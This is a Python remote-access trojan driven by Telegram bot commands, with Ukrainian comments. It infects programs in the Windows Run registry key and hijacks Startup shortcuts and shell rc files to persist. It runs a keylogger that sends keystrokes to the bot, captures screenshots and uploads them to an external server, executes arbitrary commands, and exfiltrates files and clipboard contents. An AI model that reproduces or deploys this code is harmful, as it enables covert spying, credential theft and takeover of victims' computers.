#python.exe -i "$(FULL_CURRENT_PATH)"
import requests
import io
import json
import time
import base64
import shutil
from time import time
import random
import subprocess
import socket
import time
import os
import sys
import multiprocessing
from multiprocessing import Pool,Process,Queue,Lock
from pynput.keyboard import Key, Controller
from pynput.keyboard import HotKey
from pynput import keyboard
from pynput.mouse import Button, Controller as mController
import pyAesCrypt
class MyProcess(Process):
    all=[]
    def __init__(self, group=None, target=None, name=None, args=(), kwargs={},
                 *, daemon=None):
        super(MyProcess, self).__init__(target=None,  args=(),kwargs={})
        self._target=target
        self._args=args
        MyProcess.all.append(self)
        print(len(self.all))
        
    def run(self):
        print('MyProc')
        if self._target:
            self._target(*self._args, **self._kwargs)        
    @classmethod
    def killAll(cls):
        print('killall')
        for prc in cls.all:
            prc.terminate()
            print(f'{prc.name} exited')
            print(len(MyProcess.all))
        os._exit(0)
    def terminate(self):
        print(multiprocessing.current_process().name,' exited')
        MyProcess.all.remove(self)
        self._check_closed()
        self._popen.terminate()
        
if os.name=='nt':
    try:
        import win32com.client
        import winreg                    
    except ImportError:
        logging.debug('Для вінди pip install win32com')
file="file.ps1"
takescreenshot="""
$dirName  = ".\"
$FileName = "Screenshot"
function Take-Screenshot{
[cmdletbinding()]
param(
 [Drawing.Rectangle]$bounds, 
 [string]$path
) 
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
   $bmp.Save($path)
   $graphics.Dispose()
   $bmp.Dispose()
}

#Function to get the primary monitor resolution.
#This code is sourced from 
# https://techibee.com/powershell/powershell-script-to-get-desktop-screen-resolution/1615

function Get-ScreenResolution {
 $Screens = [system.windows.forms.screen]::AllScreens
 foreach ($Screen in $Screens) {
  $DeviceName = $Screen.DeviceName
  $Width  = $Screen.Bounds.Width
  $Height  = $Screen.Bounds.Height
  $IsPrimary = $Screen.Primary
  $OutputObj = New-Object -TypeName PSobject
  $OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName
  $OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width
  $OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height
  $OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary
  $OutputObj
 }
}

#Main script begins

#By default captured screenshot will be saved in %temp% folder
#You can override it here if you want
$datetime = (Get-Date).tostring("dd-MM-yyyy-hh-mm")
$FileName = "{0}" -f $FileName
$mydirectory = $dirName
$Filepath = join-path $mydirectory $FileName

[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")

if(!($width -and $height)) {

 $screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}
 $Width = $screen.Width
 $Height = $screen.height
}

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height)

Take-Screenshot -Bounds $bounds -Path "$Filepath.png"

"""
		
hostname=socket.gethostname()
ip_address = socket.gethostbyname(hostname)
links_list=[]    
cht=TOKEN=0
OFFSET=0
icnt=0
basestr=""
SND_BOT_TOKEN=""
dstr=base64.b64decode(basestr)
mystr=dstr.decode('ascii')
keys=mystr.split('\n')
cnt=0
bufferSize=64*1024
for el in keys:
	if '=' in el:
		ky,vl=el.split('=')
		if cnt==0:
			TOKEN=vl[1:-1]
		else:
			cht=int(vl)
		cnt+=1

BOT_URL="https://api.telegram.org/bot{token}/{method}"
def ClipBoard(input):
    #@description: A quick way to set and get your clipboard.
    #@author: Jeremy England (SimplyCoded)
    if not input:
        cbrd = win32com.client.Dispatch('HTMLFile')
        fn_return_value = cbrd.parentWindow.clipboardData.getData('Text')
        if not fn_return_value:
            fn_return_value = ''
    else:
        shell=win32com.client.Dispatch("WScript.Shell")
        shell.Run('mshta.exe javascript:eval("document.parentWindow.clipboardData.setData(\'text\',\'' + Replace(Replace(Replace(input, '\'', '\\\\u0027'), '"', '\\\\u0022'), Chr(13), '\\\\r\\\\n') + '\');window.close()")', 0, True)
    return fn_return_value

def MemoryCrypter(path,is_encrypted,password):
    if "win" in sys.platform:
        subprocess.check_output(f'attrib -h -s {path}', shell=True) 
    sequence_bytes = io.BytesIO()
    with open(path,"rb") as f:
        file_content=io.BytesIO(f.read())
		
    with open(path,"wb") as f:
        if is_encrypted:
            pyAesCrypt.encryptStream(file_content,sequence_bytes,password,bufferSize)
        else:
            pyAesCrypt.decryptStream(file_content,sequence_bytes,password,bufferSize,len(file_content.getvalue()))
        f.write(sequence_bytes.getvalue())

def checkIFRunned(num):
    myname=sys.argv[0]
    base=os.path.basename(myname)
    myname,base=base,myname
    print(f"{myname=}{base=}")
    sFlag=0
    cmd="tasklist"
    if os.name=='nt':
        res= subprocess.check_output(f'chcp 65001 | {cmd}', shell=True)
    else:
        res= subprocess.check_output(f'ps auxw', shell=True)
    try:
        res=res.rstrip(b'\x00').decode("utf_8")
        res=str(res).split('\n')
    except:
        res=str(res).split(r'\r\n')
    for item in res:
        if myname in item:
            sFlag+=1
    if sFlag>num:
        return 1
    else: 
        return 0

def gen_random_name(dirname):
    while True:
        fname=''
        randchrs=[chr(ch) for ch in range(33,127)]
        for i in range(5,10+random.randint(0,20)):
            fname+=random.choice(randchrs)
        for ch in fname:
            if ch in [">","<","/","\\"," ","|",":","?","*",'"']:
                fname=fname.replace(ch,'_')
        fname=dirname+"\\"+fname+".exe"
        if not os.path.exists(fname):
            return fname
            
def get_links(directory_path,extlist=[]):
    global links_list
    
    hostname=socket.gethostname()
    for root, dirs, files in os.walk(directory_path):
        for name in files:
            fname=os.path.join(root, name)
            if any([ele for  ele in extlist if fname.endswith("."+ele)]):
                splittup=os.path.splitext(fname)
                ext=splittup[1]
                if ext=='':
                    ext='default'
                if not fname.startswith('/media') and not hostname in fname:
                    links_list.append((fname,ext[1:]))
                    
def start_victim_file():
    appdatafile=os.environ['APPDATA']+"\\desktop.ini"
    if os.path.exists(appdatafile):
        with open(appdatafile,'r',encoding='utf-8') as fl:
            lns=fl.readlines()
            for line in lns:
                try:
                    orig,vict=line.split('.exe')
                    if vict.endswith(".exe"):
                        vict='"'+vict+'"'
                        print(f"Пробуємо запустити {vict}")
                        os.popen(vict)
                except:
                    continue
                    
def copyFile(src,dst):
    try:
        shutil.copy(src,dst)
    except shutil.Error as e:
        logging.debug('Error: %s' % e)
    except IOError as e:
        logging.debug('Error: %s' % e.strerror)
        
def moveFile(src,dst):
    try:
        shutil.move(src,dst)
    except shutil.Error as e:
        logging.debug('Error: %s' % e)
    except IOError as e:
        logging.debug('Error: %s' % e.strerror)        
        
def check_intr():
    try:
        requests.get("https://github.com")
        return 1
    except Exception:
        return -1
 
def waitForConnection():
    while True:
        if check_intr()<0:
            print('[-]No connection')
            time.sleep(10)
        else:
            break

def winntAutoRun():
    fname=sys.argv[0]
    Fname=fname.split('\\')[-1]
    appdata = os.environ['APPDATA']
    newScripFName=appdata+'\\'+Fname
    copyFile(fname,newScripFName)    
    fname=newScripFName
#############################
    appdatafile=os.environ['APPDATA']+"\\desktop.ini"
    access_registry = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    access_key = winreg.OpenKey(access_registry,"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    autorunlst=[]
    victimLst=[]
    infFlag=False
    for n in range(20):
        try:
            x =winreg.EnumValue(access_key,n)
            autorunlst.append(x[1])
        except:
            break
    for idx,item in enumerate(autorunlst):
        if ".exe" in item.lower():
            # print(item)
            try:
                victim=item[:item.index(".exe")+4]
                victim=victim.replace('"','')
                dirname=os.path.split(victim)[0]
                
                print(f"{dirname=} {victim=}")
                victimLst.append((victim,dirname,idx))
            except:
                pass
    for item in victimLst:
        victim,dirname,idx=item
        if os.path.exists(appdatafile):
            with open(appdatafile,'r',encoding='utf-8') as fl:
                lns=fl.readlines()
                for line in lns:
                    if victim in line:
                        infFlag=True
                        print(f"{victim} Вже заражено")
                        return
                    else:
                        infFlag=False    
    if infFlag==False:
        for victim,dirname,idx in victimLst:
            try:
                newfname=gen_random_name(dirname)
                copyFile(victim,newfname)

                with open(appdatafile,'w',encoding='utf-8') as fl:
                    fl.write(autorunlst[idx]+" "+newfname)
                print(f'[+]Пробуємо заразити {victim} {newfname}')
                copyFile(sys.argv[0],victim)
                os.system(f"attrib +h +s {newfname}")
                if os.path.exists(newfname):
                    return
            except:
                print('Не вдалося ')


#############################
    global links_list
    shell = win32com.client.Dispatch("WScript.Shell")
    srUpFolder=shell.SpecialFolders.Item("StartUp")
    get_links(srUpFolder,['lnk'])
    sFlag=False
    infFlag=False
    autoRunItems=shell.RegRead('HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\Run\\')
    print(f'{autoRunItems=}')
    for aitem in autoRunItems:
        print(aitem)
    for link in links_list:
        mylink=shell.CreateShortcut(link[0])
        target=mylink.TargetPath
        if fname in target:
            sFlag=True
            print('Вже заражено ярлик')
            return
    if sFlag==False:
        if not os.path.exists(f"{os.environ['TMP']}\\oldlinks\\"):
            os.mkdir(f"{os.environ['TMP']}\\oldlinks\\")
            print("Створили папку для ярликів")
            
        for link in links_list:
            mylink=shell.CreateShortcut(link[0])
            target=mylink.TargetPath
            extension=os.path.splitext(target)[1][1:]
            wd=mylink.WorkingDirectory
            oldlink=f"{os.environ['TMP']}\\oldlinks\\{os.path.split(link[0])[1]}"
            if fname not in target:
                
                copyFile(link[0],oldlink)
                bat=f'{fname}.vbs'
                os.system("attrib -h -s %s" %bat)
                script=f"""with CreateObject("WScript.Shell")
                .Run \"\"\"{oldlink}\"\"\"
                .Run "{fname}"
                end with
                """
                with open(f'{fname}.vbs','w') as bat:
                    bat.write(script)
                bat=f'{fname}.vbs'
                os.system("attrib +h +s %s" %bat)
                print(f'Пробую заразити ярлик {link[0]}')
                ico=mylink.IconLocation
                print(link[0],' ',mylink.TargetPath)
                newtarget='cmd.exe /c start "'+fname+'" && '+target
                if ".exe" in target:
                    mylink.IconLocation=target + ",0"
                else:
                    mylink.IconLocation=ico
                    if "." in target:
                        regKey='HKEY_CLASSES_ROOT\\'+extension.upper()+'File\\DefaultIcon\\'
                        ico=shell.RegRead(regKey)
                        mylink.IconLocation=ico
                    else:
                        mylink.IconLocation=shell.ExpandEnvironmentStrings("%windir%")&"\system32\shell32.dll,4"
                print(f"{newtarget=}")
                mylink.TargetPath=bat
                mylink.WorkingDirectory=wd
                mylink.WindowStyle=7
                try:
                    mylink.save()
                    infFlag=True
                    return
                except:
                    print('Не вдалося заразити файл')
                break



#########    
    fname=sys.argv[0]
    Fname=fname.split('\\')[-1]
    startup = shell.SpecialFolders.Item("StartUp")
    newScripFName=startup+'\\'+Fname
    copyFile(fname,newScripFName)
    return

def addToAutoRun():
    global sep
    shell=os.environ['SHELL']
    home=os.environ['HOME']
    scrptName=sys.argv[0]
    sep='/'
    if os.name=='nt':
        sep='\\'
        newScripFName=home+sep+scrptName
    else:
        newScripFName=home+sep+".config"+sep+scrptName
    copyFile(scrptName,newScripFName)
    copyFile("config.py",home+sep+".config"+sep+"config.py")
    shell=shell[shell[::-1].index(sep)*(-1):]
    if os.name=='nt':
        shell=shell[:shell.index('.')]
    if any([ele for ele in ["bash","zsh","csh","ksh","tcsh"] if (ele==shell) ]):
        pass
    else:
        print('[-]Shell doesn\'t exist')
        return 
    if os.name=='nt':
        autoconf=f"{home}{sep}.{shell}rc"
    else:
        autoconf=f"{home}{sep}.{shell}rc"
    autoflg=False
    logging.debug(autoconf)
    sptnm=os.path.split(scrptName)[1]
    if os.path.exists(autoconf):
        with open(autoconf,'r+') as shellrc:
            lines=shellrc.readlines()
            for line in lines:
                if f"{sptnm}" in line:
                    autoflg=True
    if autoflg==True:
        logging.info('!!!Файл вже додано для автозапуску!!!')
    else:
        logging.info('Зараз додаємо файл в автозапуск')
        try:
            with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")
        except FileNotFoundError:
            with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")            
    return

def sendmsg(bot_token,chtid,msgtext):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {
        "chat_id": chtid,
        "text": msgtext,
    }
    try:
        requests.post(url, params=params)
    except Exception as e:
        print(e)
       
def commandExecute(cmd,bot_token,chtid):
    try:
        res= subprocess.check_output(f'chcp 65001 | {cmd}', shell=True)
    except OSError:
        print('Cant run command')
    try:
        res=res.rstrip(b'\x00').decode("utf_8")
        res=str(res).split('\n')
    except:
        res=str(res).split(r'\r\n')

    print(res)
    if type(res)==type([]):
        for item in res:

            sendmsg(bot_token,chtid,str(item))    
            print(f"sendmsg {item}")
            
def parseKeys(key,kbd):
    """
        Process chains with hotkeys and strings to type
        :param key string with hotkeys or string separated by |
        :param kbd pynput.keyboard.Controller
    """
    if "|" in key:
        items=key.split("|")
        print(items)
        for item in items:
            if item.startswith("<"):
                keys=HotKey.parse(item)
                time.sleep(1)
                for it in keys:
                    kbd.press(it)
                for it in keys[::-1]:
                    kbd.release(it)                 
            elif item.startswith("'") and len(item)>3:
                item=item[1:-1]
                time.sleep(1)
                print('Строка ',item)
                kbd.type(item)
    elif key.startswith("<"):
        keys=HotKey.parse(key)
        time.sleep(1)
        for it in keys:
            kbd.press(it)
        for it in keys[::-1]:
            kbd.release(it)                 
    
    elif key.startswith("'"):
        key=key[1:-1]
        time.sleep(1)
        print('Строка ',key)
        kbd.type(key)
        
        return
def save_file(bot_token,file_path,fname):
    url=f"https://api.telegram.org/file/bot{bot_token}/{file_path}"
    print(f"{url=}")
    with open(fname, 'wb') as handle:
        response = requests.get(url, stream=True)
        hdrs=response.headers
        print(f"Content-Type {hdrs['Content-Type']}")
        if not response.ok:
            print("ok")
        for block in response.iter_content(1024):
         if not block:
             break
         handle.write(block)
         
def get_file(bot_token,chtid,file_id):
    url=f"https://api.telegram.org/bot{bot_token}/getFile"
    data = {'chat_id' : chtid,'file_id':file_id}
    r=requests.post(url,params=data)
    return json.loads(r.text)
    
def send_document(bot_token,chtid,docfile,caption='Nothing'):
    url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
    data = {'chat_id' : chtid,'caption': caption}
    files={'document': open(docfile, 'rb')}
    r=requests.post(url,params=data,files=files)
    return
def send_photo(bot_token,chtid,docfile,caption='Nothing'):
    url=f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    data = {'chat_id' : chtid,'caption': caption}
    files={'photo': open(docfile, 'rb')}
    r=requests.post(url,params=data,files=files)
    return
    
def get_updates(offset):
    tg_requests=requests.get(BOT_URL.format(token=TOKEN,method=f"getUpdates?offset={offset}"))
    try:
        tg_req_data=json.loads(tg_requests.text)
        return tg_req_data
    except Exception as e:
        print(e)
 
def getfilelistProc(wt,cht,msg):
    msg=msg.split(' ')
    if len(msg)<2:
        return
    dirname=msg[1]
    if os.path.exists(dirname):
        with open("filelist.txt","w",encoding='utf-8') as fl:
            for root, dirs, files in os.walk(dirname):
                for name in files:
                    fname=os.path.join(root, name)
                    fl.write(f"{fname}\n")
        send_document(wt,cht,"filelist.txt",f"COMPNAME {hostname} dirname {dirname}")
    return   

def screenshotProc():
    """
        Makes screenshot every second encrypt it and sends me on my webserver
        
    """
    print("[+]screenshotProc has started")
    global file
    global hostname
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    }
    session = requests.Session()
    r = session.get('http://test1.ru/init.php', headers = headers)
    post_request = session.post('http://test1.ru/init.php', {
         'compname':f"COMPNAME_{hostname}"
    })
    while True:
        with open(file,"w",encoding='utf-8') as fl:
            fl.write(takescreenshot)        
        command=f"Powershell -ExecutionPolicy Bypass -File .\{file}  "
        subprocess.check_output(command, shell=True)    
        copyFile("screenshot.png","newpng.png")
        MemoryCrypter("newpng.png",1,hostname)
        data={
            'key': 'SD4q5',
            'uploadBtn': 'Upload',
            'compname': f'COMPNAME_{hostname}',
            'dirname':'screenshots',        
        }
        files = {
            'uploadedFile': open('newpng.png', 'rb'),
        }            
        response = requests.post('http://test1.ru/upload.php', headers=headers, params=data,files=files)
        
        time.sleep(1)

def klgProc(klogQueue,TOKEN,cht):
    print("[+]KeyLogger mode activated")
    sendmsg(TOKEN,cht,"[+]KeyLogger mode activated")
    Process(target=keyloggerProc,args=(klogQueue,TOKEN,cht)).start()
    def releaseKey(key):
        klogQueue.put(key)
    with keyboard.Listener(
        on_release=releaseKey,suppress=False
    ) as listener:
        listener.join()    

def keyloggerProc(klogQueue,TOKEN,cht):

    klog=''
    counter=15
    mymsg=''
    while True:
        while not klogQueue.empty():
            msg=klogQueue.get()
            try:
                if msg=='TERMINATE':
                    print('keyloggerProc TERMINATED')
                    return
            except ValueError:
                pass
            if counter!=0:
                msg=str(msg)
                if msg.startswith("'"):
                    mymsg+=msg[1]    
                if msg=='Key.space':
                    mymsg+=' '
                klog+=msg
                counter-=1
            else:
                msg=str(msg)
                if msg.startswith("'"):
                    mymsg+=msg[1]
                if msg=='Key.space':
                    mymsg+=' '                    
                klog+=msg
                translation = str.maketrans(dict(zip("qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./","йцукенгшщзхїфівапролджєячсмитьбю.ЙЦУКЕНГШЩЗХЇФІВАПРОЛДЖЄЯЧСМИТЬБЮ.")))
                translation = mymsg.translate(translation)
                counter=15
                sendmsg(TOKEN,cht,klog)
                sendmsg(TOKEN,cht,mymsg)
                sendmsg(TOKEN,cht,translation)
                klog=''
                mymsg=''
            

def superProc(wt,cht,msg):
    """
        Process /screenshot /getfile /command /execute /clip commands
        sends answer to person who controls computer
        
    """
    global file
    global takescreenshot
    print('[+]SuperProc стартував')
    try:
        if msg.startswith("/screenshot"):  
            with open(file,"w",encoding='utf-8') as fl:
                fl.write(takescreenshot)        
            cmdlst=msg.split(' ')
            num=1
            if len(cmdlst)>1:
                num=int(cmdlst[1])
            for _ in range(num):
                command=f"Powershell -ExecutionPolicy Bypass -File .\{file}  "
                subprocess.check_output(command, shell=True)                
                current_time = time.localtime()
                cur_date=time.strftime('%Y-%m-%d_%H-%M', current_time)        
                send_photo(SND_BOT_TOKEN,cht,"screenshot.png",f"COMPNAME {hostname}_{ip_address} {cur_date} screenshot")
                time.sleep(3)
        elif msg.startswith("/getfile"):
            msg=msg.split(' ')
            if len(msg)<2:
                return
            fname=msg[1]
            if os.path.exists(fname):
                send_document(wt,cht,fname,f"COMPNAME {hostname} file {fname}")
        elif msg.startswith("/getdir"):
            dname=msg[len("/getdir "):]
            print(dname)
            if os.path.exists(dname) and os.path.isdir(dname):
                for name in os.listdir(dname):
                    fname=f"{dname}\{name}"
                    print(fname)
                    if os.path.isfile(fname):
                        print(fname)
                        send_document(wt,cht,fname,f"COMPNAME {hostname} file {fname}")
                        time.sleep(3)
        elif msg.startswith("/getfilelist"):
            print('Yes GetFileList')
            msg=msg.split(' ')
            if len(msg)<2:
                return
            dirname=msg[1]
            if os.path.exists(dirname):
                with open("filelist.txt","w",encoding='utf-8') as fl:
                    for root, dirs, files in os.walk(dirname):
                        for name in files:
                            fname=os.path.join(root, name)
                            print(fname)
                            fl.write(f"{fname}\n")
                send_document(wt,cht,"filelist.txt",f"COMPNAME {hostname} file {fname}")
                time.sleep(3)
            else:
                print(f"{dirname=} doesn't exist")
        elif msg.startswith("/execute"):
            cmd=msg[len("/execute "):]
            subprocess.check_output(cmd, shell=True)     
        elif msg.startswith("/command"):  
            cmd=msg[len("/command "):]
            print(cmd)
            commandExecute(cmd,wt,cht) 
        elif msg.startswith("/clip"):
            clip=ClipBoard(None)
            if clip!="":
                sendmsg(wt,cht,f"Clipboard:{clip}")
    except Exception as ex:
        print(ex)
   
   
def get_keyboard(TOKEN,cht,queuePress,queueRelease): 
    """
        Process recieved key presses from commands 
        /key -press gets from queuePress key 
        /keyr - release key gets from queueRelease
        Press and release those keys
        Also process HotKeyes and press them
        
    """
     
    print('[+]Keyboard proc has started')
    keyboardctl=Controller()

    while True:
        while not queuePress.empty():
        
            key=queuePress.get()
            try:
                if key.startswith('Key'):
                    if "+" not in key:
                        keyboardctl.press(eval(key))
                if key.startswith('<'):
                    parseKeys(key,keyboardctl)
                elif "|" in key:
                    parseKeys(key,keyboardctl)
                                
                        
                    
                elif key.startswith("'"):
                    if len(key)==3:
                        key=key[1:-1]
                        keyboardctl.press(key)
                    else:
                        key=key[1:-1]
                        keyboardctl.type(key)
            except:
                print('Error')
            if not queueRelease.empty():
                relKey=queueRelease.get()
                try:
                    if relKey.startswith('Key'):
                        keyboardctl.release(eval(relKey))
                    elif key.startswith("'"):
                        relKey=relKey[1:-1]
                        keyboardctl.release(relKey)
                except:
                    print('Error')                
   
      
        
if __name__ == '__main__':
    multiprocessing.freeze_support()
    res=checkIFRunned(4)
    klgrprc=None
    if res==True:
        sys.exit(1)
    mctrlr=mController()

    
    if os.name!='nt':
        addToAutoRun()
    else:
        sep='\\'
        winntAutoRun()
        start_victim_file()
    waitForConnection()

    current_time = time.localtime()
    cur_date=time.strftime('%Y-%m-%d_%H-%M', current_time)        
    sendmsg(TOKEN,cht,f"Hello I'am COMPNAME {hostname}_{ip_address} os:{sys.platform} {cur_date}")
    queue=Queue()
    releaseQueue=Queue()
    klgQueue=Queue()
    MyProcess(target=get_keyboard,args=(TOKEN,cht,queue,releaseQueue)).start()
    #MyProcess(target=screenshotProc,args=()).start()
       
    while True:
        try:
            data=get_updates(OFFSET)
            result=data["result"]               
            for res in result:
                OFFSET=res["update_id"]+1
                try:
                    if  cht==res["message"]["from"]["id"] and res["message"]["document"]:
                        fileName=res['message']["document"]['file_name']
                        fmime=res['message']["document"]['mime_type']
                        fileId=res['message']["document"]['file_id']
                        fileSize=res['message']["document"]['file_size']
                        dirpath=res['message']['caption']
                        fileres=get_file(TOKEN,cht,fileId)
                        print(fileres)
                        filepath=fileres['result']['file_path']
                        save_file(TOKEN,filepath,fileName)
                        try:
                            if os.path.exists(dirpath) and os.path.isdir(dirpath):
                                moveFile(fileName,f"{dirpath}//{fileName}")
                        except FileNotFoundError:
                            print(f"{dirpath} not found")
                except:
                    pass
                    
                msg=res["message"]["text"]
                if cht==res["message"]["from"]["id"]:
                    if "°/" in msg:
                        print(msgitems)
                    else:
                        msgitems=list(msg)
                    msgitems=msg.split("°/")
                    for msg in msgitems:
                        if msg[0]!='/':
                            msg='/'+msg
                        if msg.startswith("/keylogger"):
                            if klgrprc==None:
                                klgrprc=MyProcess(target=klgProc,args=(klgQueue,TOKEN,cht))
                                klgrprc.start()
                            else:
                                klgQueue.put("TERMINATE")
                                klgrprc.terminate()
                                print("KeyLogger mode was deactivated")
                                klgrprc=None
                                sendmsg(TOKEN,cht,"KeyLogger mode was deactivated")
                                continue
                        if msg.startswith("/start"):
                            current_time = time.localtime()
                            cur_date=time.strftime('%Y-%m-%d_%H-%M', current_time)        
                            sendmsg(TOKEN,cht,f"Hello I'am COMPNAME {hostname}_{ip_address} {cur_date} screenshot")                       
                        if msg.startswith("/getfilelist"):
                            MyProcess(target=getfilelistProc,args=(TOKEN,cht,msg)).start()
                        if msg.startswith("/key"):
                            print("key command")
                            try:
                                if not msg.startswith('/keyr'):
                                    keys=msg[5:]
                                    queue.put(keys)
                                    print('press keys in queue '+keys)
                                else:
                                    keys=msg[4:]
                                    releaseQueue.put(keys)
                                    print('release keys '+keys)                                
                            except ValueError:
                                print("value error")
                        if any([ele for ele in ["/screenshot","/getfile","/getdir","/command","/execute","/clip"] if msg.startswith(ele) ]):
                            MyProcess(target=superProc,args=(TOKEN,cht,msg)).start()
            
        except KeyboardInterrupt:
            print('mykeyboardinterrupt')
            MyProcess.killAll()
            break
        except:
            continue
